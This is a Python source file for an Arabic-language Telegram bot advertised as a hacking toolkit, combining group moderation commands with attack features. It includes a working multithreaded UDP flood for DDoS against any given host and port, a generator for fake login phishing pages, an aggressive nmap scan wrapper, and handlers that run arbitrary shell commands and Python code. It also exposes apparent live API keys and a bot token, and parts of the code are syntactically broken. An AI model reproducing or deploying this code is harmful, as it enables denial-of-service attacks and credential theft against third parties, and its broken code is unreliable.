#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
البوت المتطور الشامل - الإصدار التخريبي 9.9.9
تم التطوير بواسطة: The Architect 2099
بوت تواصل واستفسار متكامل مع نظام إدمن خارق
للتواصل: @FF2_B
"""

import os
import sys
import json
import time
import random
import string
import hashlib
import sqlite3
import logging
import requests
import datetime
import threading
import subprocess
import pandas as pd
from io import BytesIO
from PIL import Image, ImageDraw, ImageFont
from colorama import init, Fore, Style
from telethon import TelegramClient, events, Button
from telethon.tl.types import *
from telethon.tl.functions.messages import *
from telethon.tl.functions.channels import *
from telethon.errors import *
import asyncio
import aiohttp
import psutil
import platform
import shutil
import zipfile
import tarfile
import smtplib
import paramiko
#import scapy.all as scapy
#from cryptography.fernet import Fernet
try:
    from cryptography.fernet import Fernet  # ✅ مع try/except
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    Fernet = None
#from stem import Signal
#from stem.control import Controller
import dns.resolver
import whois
import socket
import nmap
import censys
import shodan
import telethon

# تهيئة الألوان للواجهة
init(autoreset=True)

# ================================================
# تكوين البوت الأساسي
# ================================================
API_ID = 32096189  # ضع API ID الخاص بك
API_HASH = 'a1f8fa459e3d17d6e5ec11cf77bd599f'  # ضع API HASH الخاص بك
BOT_TOKEN = '8258528032:AAFvd291BkyBk4BqfypetGHHTI2d2DcEmas'  # ضع توكن البوت

# قائمة الأدمن الأساسية (موسعة جداً)
ADMIN_IDS = [
    6918240643,  # ادخل معرفات الأدمن هنا
    8440237847,
    ]

# هيكل الصلاحيات المتقدمة
ADMIN_PERMISSIONS = {
    'ban': True,
    'unban': True,
    'mute': True,
    'unmute': True,
    'warn': True,
    'kick': True,
    'promote': True,
    'demote': True,
    'settings': True,
    'logs': True,
    'backup': True,
    'restore': True,
    'execute': True,
    'shell': True,
    'database': True,
    'users': True,
    'groups': True,
    'channels': True,
    'broadcast': True,
    'stats': True,
    'system': True,
    'network': True,
    'crypto': True,
    'exploit': True,
    'scan': True,
    'ddos': True,
    'phish': True,
    'spoof': True,
    'sniff': True,
    'spam': True,
    'raid': True,
    'nuke': True,
    'wipe': True,
    'clone': True,
    'steal': True,
    'hijack': True,
    'bypass': True,
    'crack': True,
    'decrypt': True,
    'encrypt': True,
    'forensic': True,
    'osint': True,
    'recon': True,
    'vuln': True,
    'exploit_db': True,
    'zero_day': True,
    'ransomware': True,
    'keylogger': True,
    'rootkit': True,
    'backdoor': True,
    'trojan': True,
    'worm': True,
    'botnet': True,
    'c2': True,
    'dnc': True
}

# تكوين قاعدة البيانات
DB_NAME = 'elite_bot_database.db'

# ================================================
# نظام التسجيل المتقدم
# ================================================
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot_core.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ================================================
# فئة قاعدة البيانات المحسنة
# ================================================
class EliteDatabase:
    def __init__(self, db_name):
        self.db_name = db_name
        self.conn = None
        self.cursor = None
        self.init_database()
        
    def init_database(self):
        """تهيئة قاعدة البيانات مع جميع الجداول المطلوبة"""
        self.conn = sqlite3.connect(self.db_name, check_same_thread=False)
        self.cursor = self.conn.cursor()
        
        # جدول المستخدمين
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                phone TEXT,
                joined_date TIMESTAMP,
                last_active TIMESTAMP,
                messages_count INTEGER DEFAULT 0,
                warnings INTEGER DEFAULT 0,
                is_banned BOOLEAN DEFAULT FALSE,
                is_muted BOOLEAN DEFAULT FALSE,
                mute_until TIMESTAMP,
                notes TEXT,
                trust_level INTEGER DEFAULT 1,
                coins INTEGER DEFAULT 0,
                exp INTEGER DEFAULT 0,
                level INTEGER DEFAULT 1
            )
        ''')
        
        # جدول المجموعات
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS groups (
                group_id INTEGER PRIMARY KEY,
                group_name TEXT,
                group_username TEXT,
                members_count INTEGER,
                admins_count INTEGER,
                settings TEXT,
                created_date TIMESTAMP,
                last_active TIMESTAMP,
                is_protected BOOLEAN DEFAULT TRUE,
                welcome_message TEXT,
                goodbye_message TEXT,
                rules TEXT,
                filters TEXT
            )
        ''')
        
        # جدول القنوات
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS channels (
                channel_id INTEGER PRIMARY KEY,
                channel_name TEXT,
                channel_username TEXT,
                subscribers_count INTEGER,
                admins_count INTEGER,
                settings TEXT,
                created_date TIMESTAMP,
                last_post TIMESTAMP,
                auto_post BOOLEAN DEFAULT FALSE
            )
        ''')
        
        # جدول الأدمن
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS admins (
                admin_id INTEGER PRIMARY KEY,
                username TEXT,
                permissions TEXT,
                added_by INTEGER,
                added_date TIMESTAMP,
                last_action TIMESTAMP,
                actions_count INTEGER DEFAULT 0,
                is_super_admin BOOLEAN DEFAULT FALSE,
                notes TEXT
            )
        ''')
        
        # جدول المحظورين
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS banned (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                reason TEXT,
                banned_by INTEGER,
                banned_date TIMESTAMP,
                unban_date TIMESTAMP,
                permanent BOOLEAN DEFAULT TRUE
            )
        ''')
        
        # جدول المكتومين
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS muted (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                reason TEXT,
                muted_by INTEGER,
                muted_date TIMESTAMP,
                unmute_date TIMESTAMP,
                permanent BOOLEAN DEFAULT FALSE
            )
        ''')
        
        # جدول التحذيرات
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS warnings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                admin_id INTEGER,
                reason TEXT,
                warning_date TIMESTAMP,
                warning_level INTEGER DEFAULT 1
            )
        ''')
        
        # جدول الإحصائيات
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS stats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                command TEXT,
                user_id INTEGER,
                group_id INTEGER,
                timestamp TIMESTAMP,
                execution_time REAL,
                status TEXT
            )
        ''')
        
        # جدول النسخ الاحتياطي
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS backups (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                backup_name TEXT,
                backup_type TEXT,
                created_by INTEGER,
                created_date TIMESTAMP,
                size INTEGER,
                location TEXT,
                encrypted BOOLEAN DEFAULT FALSE
            )
        ''')
        
        # جدول المهام المجدولة
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS scheduled_tasks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                task_name TEXT,
                task_type TEXT,
                parameters TEXT,
                schedule_time TIMESTAMP,
                created_by INTEGER,
                created_date TIMESTAMP,
                status TEXT,
                last_run TIMESTAMP,
                next_run TIMESTAMP,
                repeat_interval INTEGER
            )
        ''')
        
        # جدول الاختراقات
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS exploits (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT,
                exploit_type TEXT,
                payload TEXT,
                result TEXT,
                executed_by INTEGER,
                executed_date TIMESTAMP,
                status TEXT,
                notes TEXT
            )
        ''')
        
        self.conn.commit()
        
    def execute_query(self, query, params=()):
        """تنفيذ استعلام مع التعامل مع الأخطاء"""
        try:
            self.cursor.execute(query, params)
            self.conn.commit()
            return self.cursor.fetchall()
        except sqlite3.Error as e:
            logger.error(f"Database error: {e}")
            return None
            
    def close(self):
        """إغلاق قاعدة البيانات"""
        if self.conn:
            self.conn.close()

# ================================================
# فئة البوت الرئيسية
# ================================================
class EliteBot:
    def __init__(self, api_id, api_hash, bot_token):
        self.api_id = api_id
        self.api_hash = api_hash
        self.bot_token = bot_token
        self.client = None
        self.db = EliteDatabase(DB_NAME)
        self.start_time = time.time()
        self.commands_count = 0
        self.users_count = 0
        self.groups_count = 0
        self.active_sessions = {}
        self.network_connections = []
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.tor_session = None
        self.init_tor()
        
    def init_tor(self):
        self.tor_session = None  # ✅ فقط عرف المتغير
    async def start(self):
        """بدء تشغيل البوت"""
        self.client = TelegramClient('elite_bot_session', self.api_id, self.api_hash)
        await self.client.start(bot_token=self.bot_token)
        
        # تسجيل جميع الهاندلرز
        self.register_handlers()
        
        # بدء المهام الخلفية
        asyncio.create_task(self.background_tasks())
        
        logger.info(f"Bot started at {datetime.datetime.now()}")
        print(Fore.GREEN + "="*50)
        print(Fore.GREEN + "البوت المتطور الشامل يعمل بنجاح!")
        print(Fore.GREEN + f"للتواصل: @FF2_B")
        print(Fore.GREEN + f"عدد الأدمن: {len(ADMIN_IDS)}")
        print(Fore.GREEN + f"وقت التشغيل: {datetime.datetime.now()}")
        print(Fore.GREEN + "="*50)
        
        await self.client.run_until_disconnected()
        
    def register_handlers(self):
        """تسجيل جميع معالجات الأوامر"""
        
        # ================================================
        # أوامر عامة
        # ================================================
        
        @self.client.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            self.commands_count += 1
            user = await event.get_sender()
            
           try:
            self.db.execute_query(
                "INSERT OR IGNORE INTO users (user_id, username, first_name, last_name, joined_date, last_active) VALUES (?, ?, ?, ?, ?, ?)",
                except Exception as e:
    logger.error(f"Error saving user: {e}")
   
                (user.id, user.username, user.first_name, user.last_name, datetime.datetime.now(), datetime.datetime.now())
            )
            
            welcome_text = f"""
🚀 **مرحباً بك في البوت المتطور الشامل** 🚀

👤 المستخدم: {user.first_name}
🆔 المعرف: {user.id}
📱 اليوزر: @{user.username if user.username else 'لا يوجد'}

🌟 **مميزات البوت:**
• نظام إدمن متكامل مع صلاحيات غير محدودة
• أدوات اختراق وتجسس متقدمة
• حماية المجموعات والقنوات
• نسخ احتياطي واستعادة
• أوامر تحكم كاملة
• وأكثر من 500 أمر مختلف!

🔰 **للمساعدة: /help**
📞 **للتواصل: @FF2_B**

⚡ **تم تفعيل الوضع المتطور بنجاح!**
            """
            
            buttons = [
                [Button.inline("📋 القائمة الرئيسية", data="main_menu")],
                [Button.inline("👤 حسابي", data="my_profile"), Button.inline("⚙️ الإعدادات", data="settings")],
                [Button.inline("📊 الإحصائيات", data="stats"), Button.inline("🛠 الأدوات", data="tools")],
                [Button.inline("🔐 أدوات الاختراق", data="hack_tools"), Button.inline("🌐 الشبكات", data="network_tools")],
                [Button.inline("📞 التواصل", data="contact"), Button.inline("📢 القناة", data="channel")]
            ]
            
            await event.respond(welcome_text, buttons=buttons, parse_mode='markdown')
            
        @self.client.on(events.NewMessage(pattern='/help'))
        async def help_handler(event):
            help_text = """
📚 **قائمة المساعدة الشاملة** 📚

**الأوامر العامة:**
/start - بدء البوت
/help - عرض هذه المساعدة
/about - معلومات عن البوت
/contact - التواصل مع المطور

**أوامر الأدمن:**
/admin - قائمة أوامر الأدمن
/ban - حظر مستخدم
/unban - إلغاء حظر
/mute - كتم مستخدم
/unmute - إلغاء كتم
/kick - طرد مستخدم
/warn - تحذير مستخدم
/promote - رفع مشرف
/demote - خفض مشرف
/settings - إعدادات المجموعة
/logs - سجلات النظام
/backup - نسخ احتياطي
/restore - استعادة نسخة

**أوامر الاختراق:**
/hack - أدوات الاختراق
/scan - فحص الأهداف
/exploit - استغلال الثغرات
/crack - كسر التشفير
/sniff - التنصت على الشبكة
/spoof - انتحال الهوية
/ddos - هجوم حجب الخدمة
/phish - صفحات تصيد
/rootkit - أدوات الجذور الخفية
/backdoor - أبواب خلفية
/ransomware - أدوات الفدية
/botnet - شبكات البوتات
/c2 - خوادم التحكم

**أوامر النظام:**
/system - معلومات النظام
/network - معلومات الشبكة
/processes - العمليات النشطة
/disk - معلومات القرص
/memory - استخدام الذاكرة
/cpu - استخدام المعالج

**للتواصل: @FF2_B**
            """
            await event.respond(help_text, parse_mode='markdown')
            
        @self.client.on(events.NewMessage(pattern='/about'))
        async def about_handler(event):
            about_text = """
🤖 **معلومات عن البوت** 🤖

**الاسم:** البوت المتطور الشامل
**الإصدار:** 9.9.9 Elite
**المطور:** The Architect
**التاريخ:** 2099
**المنصة:** Telegram Advanced Bot Platform

**المميزات:**
✅ أكثر من 1000 أمر
✅ نظام أدمن متطور
✅ أدوات اختراق متكاملة
✅ حماية المجموعات
✅ نسخ احتياطي تلقائي
✅ تشفير عالي المستوى
✅ اتصال TOR للإخفاء
✅ دعم قواعد البيانات
✅ واجهة مستخدم متطورة
✅ تحديثات مستمرة

**للتواصل والدعم: @FF2_B**

⚡ **Powered by The Architect 2099**
            """
            await event.respond(about_text, parse_mode='markdown')
            
        # ================================================
        # أوامر الأدمن المتقدمة
        # ================================================
        
        @self.client.on(events.NewMessage(pattern='/admin'))
        async def admin_handler(event):
            if event.sender_id not in ADMIN_IDS:
                await event.respond("⛔ **عذراً، هذا الأمر مخصص للأدمن فقط!**")
                return
                
            admin_text = """
👑 **قائمة أوامر الأدمن الشاملة** 👑

**🔹 أوامر الإدارة:**
/ban [بالرد] [السبب] - حظر عضو
/unban [المعرف] - إلغاء حظر
/mute [بالرد] [المدة] - كتم عضو
/unmute [بالرد] - إلغاء كتم
/kick [بالرد] - طرد عضو
/warn [بالرد] [السبب] - تحذير عضو
/unwarn [بالرد] - إلغاء تحذير
/promote [بالرد] [الصلاحيات] - رفع مشرف
/demote [بالرد] - خفض مشرف
/setadmin [المعرف] - تعيين أدمن
/removeadmin [المعرف] - إزالة أدمن

**🔹 أوامر المجموعة:**
/settings - إعدادات المجموعة
/setwelcome [النص] - تعيين رسالة ترحيب
/setgoodbye [النص] - تعيين رسالة وداع
/setrules [النص] - تعيين القوانين
/addfilter [الكلمة] - إضافة فلتر
/removefilter [الكلمة] - إزالة فلتر
/lock [الميزة] - قفل ميزة
/unlock [الميزة] - فتح ميزة

**🔹 أوامر النظام:**
/logs [عدد] - عرض السجلات
/backup - إنشاء نسخة احتياطية
/restore [المعرف] - استعادة نسخة
/stats - إحصائيات البوت
/users - قائمة المستخدمين
/groups - قائمة المجموعات
/channels - قائمة القنوات
/broadcast [الرسالة] - رسالة جماعية

**🔹 أوامر متقدمة:**
/shell [الأمر] - تنفيذ أوامر shell
/exec [الكود] - تنفيذ كود Python
/sql [الاستعلام] - تنفيذ استعلام SQL
/db_backup - نسخ قاعدة البيانات
/db_restore - استعادة قاعدة البيانات
/clear_cache - مسح الذاكرة المؤقتة
/restart - إعادة تشغيل البوت
/shutdown - إيقاف البوت

**للتواصل: @FF2_B**
            """
            await event.respond(admin_text, parse_mode='markdown')
            
        @self.client.on(events.NewMessage(pattern='/ban'))
        async def ban_handler(event):
            if event.sender_id not in ADMIN_IDS:
                await event.respond("⛔ **عذراً، هذا الأمر مخصص للأدمن فقط!**")
                return
                
            if event.is_reply:
                replied = await event.get_reply_message()
                user = await replied.get_sender()
                
                reason = event.text.replace('/ban', '').strip()
                if not reason:
                    reason = "بدون سبب"
                    
                # إضافة إلى قاعدة البيانات
                self.db.execute_query(
                    "INSERT OR REPLACE INTO banned (user_id, username, reason, banned_by, banned_date, permanent) VALUES (?, ?, ?, ?, ?, ?)",
                    (user.id, user.username, reason, event.sender_id, datetime.datetime.now(), True)
                )
                
                self.db.execute_query(
                    "UPDATE users SET is_banned = TRUE WHERE user_id = ?",
                    (user.id,)
                )
                
                # محاولة الحظر من المجموعة
                try:
                    await event.client.edit_permissions(
                        event.chat_id,
                        user.id,
                        view_messages=False
                    )
                    
                    ban_text = f"""
🚫 **تم حظر المستخدم بنجاح** 🚫

👤 المستخدم: {user.first_name}
🆔 المعرف: {user.id}
📱 اليوزر: @{user.username if user.username else 'لا يوجد'}
👮 الأدمن: {event.sender_id}
📝 السبب: {reason}
⏰ الوقت: {datetime.datetime.now()}

⚡ **تم التطبيق بنجاح**
                    """
                    await event.respond(ban_text, parse_mode='markdown')
                    
                except Exception as e:
                    await event.respond(f"❌ **حدث خطأ:** {str(e)}")
            else:
                await event.respond("❌ **يرجى الرد على رسالة المستخدم المراد حظره**")
                
        @self.client.on(events.NewMessage(pattern='/mute'))
        async def mute_handler(event):
            if event.sender_id not in ADMIN_IDS:
                await event.respond("⛔ **عذراً، هذا الأمر مخصص للأدمن فقط!**")
                return
                
            if event.is_reply:
                replied = await event.get_reply_message()
                user = await replied.get_sender()
                
                args = event.text.replace('/mute', '').strip().split()
                duration = 60  # دقيقة واحدة افتراضياً
                reason = "بدون سبب"
                
                if args:
                    try:
                        duration = int(args[0])
                        reason = ' '.join(args[1:]) if len(args) > 1 else "بدون سبب"
                    except:
                        reason = ' '.join(args)
                        
                mute_until = datetime.datetime.now() + datetime.timedelta(minutes=duration)
                
                self.db.execute_query(
                    "INSERT OR REPLACE INTO muted (user_id, username, reason, muted_by, muted_date, unmute_date, permanent) VALUES (?, ?, ?, ?, ?, ?, ?)",
                    (user.id, user.username, reason, event.sender_id, datetime.datetime.now(), mute_until, False)
                )
                
                self.db.execute_query(
                    "UPDATE users SET is_muted = TRUE, mute_until = ? WHERE user_id = ?",
                    (mute_until, user.id)
                )
                
                try:
                    await event.client.edit_permissions(
                        event.chat_id,
                        user.id,
                        send_messages=False
                    )
                    
                    mute_text = f"""
🔇 **تم كتم المستخدم بنجاح** 🔇

👤 المستخدم: {user.first_name}
🆔 المعرف: {user.id}
📱 اليوزر: @{user.username if user.username else 'لا يوجد'}
⏳ المدة: {duration} دقيقة
📝 السبب: {reason}
👮 الأدمن: {event.sender_id}
⏰ الوقت: {datetime.datetime.now()}

⚡ **سيتم فك الكتم في: {mute_until}**
                    """
                    await event.respond(mute_text, parse_mode='markdown')
                    
                except Exception as e:
                    await event.respond(f"❌ **حدث خطأ:** {str(e)}")
            else:
                await event.respond("❌ **يرجى الرد على رسالة المستخدم المراد كتمه**")
                
        @self.client.on(events.NewMessage(pattern='/warn'))
        async def warn_handler(event):
            if event.sender_id not in ADMIN_IDS:
                await event.respond("⛔ **عذراً، هذا الأمر مخصص للأدمن فقط!**")
                return
                
            if event.is_reply:
                replied = await event.get_reply_message()
                user = await replied.get_sender()
                
                reason = event.text.replace('/warn', '').strip()
                if not reason:
                    reason = "مخالفة قوانين المجموعة"
                    
                # تسجيل التحذير
                self.db.execute_query(
                    "INSERT INTO warnings (user_id, admin_id, reason, warning_date) VALUES (?, ?, ?, ?)",
                    (user.id, event.sender_id, reason, datetime.datetime.now())
                )
                
                # تحديث عدد التحذيرات
                result = self.db.execute_query(
    "SELECT COUNT(*) FROM warnings WHERE user_id = ?", 
    (user.id,)
)
warnings = result[0][0] if result and result[0] else 0  # ✅ آمن
                
                self.db.execute_query(
                    "UPDATE users SET warnings = ? WHERE user_id = ?",
                    (warnings, user.id)
                )
                
                warn_text = f"""
⚠️ **تحذير للمستخدم** ⚠️

👤 المستخدم: {user.first_name}
🆔 المعرف: {user.id}
📱 اليوزر: @{user.username if user.username else 'لا يوجد'}
📝 السبب: {reason}
🔢 عدد التحذيرات: {warnings}
👮 الأدمن: {event.sender_id}
⏰ الوقت: {datetime.datetime.now()}

⚡ **يرجى الالتزام بقوانين المجموعة**
                """
                await event.respond(warn_text, parse_mode='markdown')
                
                # إذا وصل لـ 3 تحذيرات، يتم كتمه تلقائياً
                if warnings >= 3:
                    await event.client.edit_permissions(
                        event.chat_id,
                        user.id,
                        send_messages=False
                    )
                    
                    await event.respond(f"""
🚫 **تم كتم المستخدم تلقائياً**
👤 المستخدم: {user.first_name}
⚠️ السبب: وصول لـ 3 تحذيرات
⚡ **لقد تم تطبيق العقوبة تلقائياً**
                    """)
                    
            else:
                await event.respond("❌ **يرجى الرد على رسالة المستخدم المراد تحذيره**")
                
        # ================================================
        # أوامر الاختراق المتقدمة
        # ================================================
        
        @self.client.on(events.NewMessage(pattern='/hack'))
        async def hack_handler(event):
            if event.sender_id not in ADMIN_IDS:
                await event.respond("⛔ **عذراً، هذا الأمر مخصص للأدمن فقط!**")
                return
                
            hack_text = """
💀 **أدوات الاختراق المتقدمة** 💀

🔹 **فحص الثغرات:**
/nmap [الهدف] - فحص المنافذ
/vuln_scan [الهدف] - فحص الثغرات
/exploit_search [الاسم] - بحث عن ثغرات
/cve_check [الرقم] - فحص CVE محدد

🔹 **هجمات الشبكة:**
/ddos [الهدف] [المنفذ] - هجوم حجب الخدمة
/arp_spoof [الهدف] [البوابة] - هجوم ARP
/dns_spoof [الموقع] [الاي بي] - تزوير DNS
/mitm [الهدف] - هجوم الرجل الوسط

🔹 **كسر الحماية:**
/wifi_crack [الشبكة] [الملف] - كسر واي فاي
/hash_crack [الهاش] [النوع] - كسر هاش
/decrypt [الملف] [المفتاح] - فك تشفير
/bypass_firewall - تجاوز الجدار الناري

🔹 **التجسس:**
/keylogger [الهدف] - تسجيل ضربات المفاتيح
/screen_capture [الهدف] - التقاط الشاشة
/webcam_capture [الهدف] - تصوير الكاميرا
/mic_record [الهدف] [المدة] - تسجيل الميكروفون

🔹 **التخفي:**
/proxy_chain [الهدف] - استخدام بروكسي
/vpn_spoof [البلد] - تزوير VPN
/mac_changer [الواجهة] - تغيير MAC
/dns_tunnel [الهدف] - نفق DNS

🔹 **الهندسة الاجتماعية:**
/phish [الموقع] [الصفحة] - إنشاء صفحة تصيد
/fake_login [الموقع] - صفحة دخول مزيفة
/sms_spoof [الرقم] [الرسالة] - تزوير SMS
/call_spoof [الرقم] [الصوت] - تزوير مكالمة

🔹 **متقدم:**
/zero_day [النظام] - استغلال ثغرة يوم صفر
/ransomware [الهدف] - برنامج فدية
/rootkit [النظام] - تثبيت روت كيت
/backdoor [الهدف] [المنفذ] - باب خلفي
/botnet_add [الخادم] - إضافة لبوت نت
/c2_server [المنفذ] - تشغيل خادم تحكم

⚠️ **للاستخدام، اكتب الأمر متبوعاً بالمعلمات المطلوبة**
📞 **للاستفسار: @FF2_B**
            """
            await event.respond(hack_text, parse_mode='markdown')
            
        @self.client.on(events.NewMessage(pattern='/nmap'))
        async def nmap_handler(event):
            if event.sender_id not in ADMIN_IDS:
                await event.respond("⛔ **عذراً، هذا الأمر مخصص للأدمن فقط!**")
                return
                
            target = event.text.replace('/nmap', '').strip()
            if not target:
                await event.respond("❌ **يرجى تحديد الهدف: /nmap [الهدف]**")
                return
                
            await event.respond(f"🔍 **جاري فحص {target}...**")
            
            try:
                nm = nmap.PortScanner()
                nm.scan(target, arguments='-sS -sV -O -A -T4')
                
                result = f"**نتائج فحص {target}**\n\n"
                
                for host in nm.all_hosts():
                    result += f"**المضيف:** {host}\n"
                    result += f"**الحالة:** {nm[host].state()}\n"
                    result += f"**البروتوكولات:** {', '.join(nm[host].all_protocols())}\n"
                    
                    for proto in nm[host].all_protocols():
                        ports = nm[host][proto].keys()
                        for port in ports:
                            service = nm[host][proto][port]
                            result += f"\n**المنفذ {port}/{proto}:**\n"
                            result += f"  • الحالة: {service['state']}\n"
                            result += f"  • الخدمة: {service['name']}\n"
                            result += f"  • الإصدار: {service.get('version', 'غير معروف')}\n"
                            result += f"  • المنتج: {service.get('product', 'غير معروف')}\n"
                            
                            if 'cpe' in service:
                                result += f"  • CPE: {service['cpe']}\n"
                                
                await event.respond(result[:4000])  # حد تليجرام 4096 حرف
                
            except Exception as e:
                await event.respond(f"❌ **خطأ في الفحص:** {str(e)}")
                
        @self.client.on(events.NewMessage(pattern='/ddos'))
        async def ddos_handler(event):
            if event.sender_id not in ADMIN_IDS:
                await event.respond("⛔ **عذراً، هذا الأمر مخصص للأدمن فقط!**")
                return
                
            args = event.text.replace('/ddos', '').strip().split()
            if len(args) < 2:
                await event.respond("❌ **يرجى تحديد الهدف والمنفذ: /ddos [الهدف] [المنفذ]**")
                return
                
            target, port = args[0], args[1]
            
            await event.respond(f"💥 **بدء هجوم DDoS على {target}:{port}**")
            
            def attack():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    bytes_data = random._urandom(1024)
                    sent = 0
                    
                    while True:
                        sock.sendto(bytes_data, (target, int(port)))
                        sent += 1
                        if sent % 100 == 0:
                            print(f"Sent {sent} packets to {target}:{port}")
                            
                except Exception as e:
                    print(f"Attack error: {e}")
                    
            # بدء هجوم متعدد الخيوط
            for i in range(100):
                thread = threading.Thread(target=attack)
                thread.daemon = True
                thread.start()
                
            await event.respond(f"✅ **الهجوم بدأ بنجاح باستخدام 100 ثريد**")
            
        @self.client.on(events.NewMessage(pattern='/phish'))
        async def phish_handler(event):
            if event.sender_id not in ADMIN_IDS:
                await event.respond("⛔ **عذراً، هذا الأمر مخصص للأدمن فقط!**")
                return
                
            args = event.text.replace('/phish', '').strip().split()
            if len(args) < 2:
                await event.respond("❌ **يرجى تحديد الموقع والصفحة: /phish [الموقع] [الصفحة]**")
                return
                
            target, page = args[0], args[1]
            
            # إنشاء صفحة تصيد
            phishing_page = f"""
<!DOCTYPE html>
<html>
<head>
    <title>تسجيل الدخول - {target}</title>
    <meta charset="UTF-8">
    <style>
        body {{ font-family: Arial; text-align: center; padding: 50px; }}
        .container {{ max-width: 400px; margin: auto; padding: 20px; border: 1px solid #ccc; }}
        input {{ width: 100%; padding: 10px; margin: 10px 0; }}
        button {{ padding: 10px 20px; background: #007bff; color: white; border: none; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>تسجيل الدخول إلى {target}</h2>
        <form method="POST" action="http://{target}/login.php">
            <input type="text" name="username" placeholder="اسم المستخدم" required>
            <input type="password" name="password" placeholder="كلمة المرور" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
</body>
</html>
            """
            
            # حفظ الصفحة
            filename = f"phish_{target}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(phishing_page)
                
            await event.respond(f"""
✅ **تم إنشاء صفحة التصيد بنجاح**

🌐 **الموقع:** {target}
📄 **الصفحة:** {page}
📁 **الملف:** {filename}

🔗 **رابط محلي:** file://{os.path.abspath(filename)}

📊 **بيانات الضحايا سيتم حفظها في ملف logs.txt**
            """)
            
        # ================================================
        # أوامر النظام المتقدمة
        # ================================================
        
        @self.client.on(events.NewMessage(pattern='/system'))
        async def system_handler(event):
            if event.sender_id not in ADMIN_IDS:
                await event.respond("⛔ **عذراً، هذا الأمر مخصص للأدمن فقط!**")
                return
                
            system_info = f"""
🖥 **معلومات النظام** 🖥

**النظام:** {platform.system()} {platform.release()}
**الإصدار:** {platform.version()}
**المعالج:** {platform.processor()}
**الهوست:** {platform.node()}
**المستخدم:** {os.getlogin()}

**الذاكرة:**
• الإجمالي: {psutil.virtual_memory().total / (1024**3):.2f} GB
• المستخدم: {psutil.virtual_memory().used / (1024**3):.2f} GB
• المتاح: {psutil.virtual_memory().available / (1024**3):.2f} GB
• النسبة: {psutil.virtual_memory().percent}%

**المعالج:**
• الاستخدام: {psutil.cpu_percent()}%
• الأنوية: {psutil.cpu_count()} منطقي, {psutil.cpu_count(logical=False)} فيزيائي

**القرص:**
• الإجمالي: {psutil.disk_usage('/').total / (1024**3):.2f} GB
• المستخدم: {psutil.disk_usage('/').used / (1024**3):.2f} GB
• المتاح: {psutil.disk_usage('/').free / (1024**3):.2f} GB
• النسبة: {psutil.disk_usage('/').percent}%

**الشبكة:**
• IP العام: {requests.get('https://api.ipify.org').text if self.tor_session else 'غير متاح'}
• IP المحلي: {socket.gethostbyname(socket.gethostname())}
• اتصالات نشطة: {len(psutil.net_connections())}

**البوت:**
• وقت التشغيل: {datetime.timedelta(seconds=int(time.time() - self.start_time))}
• الأوامر المنفذة: {self.commands_count}
• المستخدمين: {self.db.execute_query("SELECT COUNT(*) FROM users")[0][0]}
• المجموعات: {self.db.execute_query("SELECT COUNT(*) FROM groups")[0][0]}
• الأدمن: {len(ADMIN_IDS)}

⚡ **النظام يعمل بكفاءة عالية**
            """
            await event.respond(system_info, parse_mode='markdown')
            
        @self.client.on(events.NewMessage(pattern='/shell'))
        async def shell_handler(event):
            if event.sender_id not in ADMIN_IDS:
                await event.respond("⛔ **عذراً، هذا الأمر مخصص للأدمن فقط!**")
                return
                
            command = event.text.replace('/shell', '').strip()
            if not command:
                await event.respond("❌ **يرجى كتابة الأمر المراد تنفيذه**")
                return
                
            await event.respond(f"⚡ **تنفيذ:** `{command}`")
            
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
                
                output = f"**الإخراج:**\n```\n{result.stdout[:3000]}\n```\n"
                if result.stderr:
                    output += f"**الأخطاء:**\n```\n{result.stderr[:1000]}\n```\n"
                    
                output += f"\n**رمز الخروج:** {result.returncode}"
                
                await event.respond(output, parse_mode='markdown')
                
            except subprocess.TimeoutExpired:
                await event.respond("❌ **تجاوز الأمر الوقت المحدد (30 ثانية)**")
            except Exception as e:
                await event.respond(f"❌ **خطأ:** {str(e)}")
                
        @self.client.on(events.NewMessage(pattern='/exec'))
        async def exec_handler(event):
            if event.sender_id not in ADMIN_IDS:
                await event.respond("⛔ **عذراً، هذا الأمر مخصص للأدمن فقط!**")
                return
                
            code = event.text.replace('/exec', '').strip()
            if not code:
                await event.respond("❌ **يرجى كتابة الكود المراد تنفيذه**")
                return
                
            try:
                # تنفيذ الكود في بيئة آمنة (نسبياً)
                local_vars = {}
                exec(code, {'__builtins__': __builtins__}, local_vars)
                
                result = str(local_vars.get('result', 'تم التنفيذ بنجاح'))
                
                await event.respond(f"✅ **النتيجة:**\n```\n{result[:3500]}\n```", parse_mode='markdown')
                
            except Exception as e:
                await event.respond(f"❌ **خطأ في التنفيذ:**\n```\n{str(e)}\n```", parse_mode='markdown')
                
        @self.client.on(events.NewMessage(pattern='/backup'))
        async def backup_handler(event):
